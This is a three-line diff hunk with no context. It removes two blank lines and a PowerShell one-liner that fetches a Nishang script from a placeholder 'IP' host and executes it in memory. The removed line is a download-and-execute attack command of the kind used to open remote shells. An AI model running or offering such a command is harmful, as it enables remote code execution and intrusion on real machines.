@@ -1,3 +1,0 @@
-
-
-powershell "IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')"
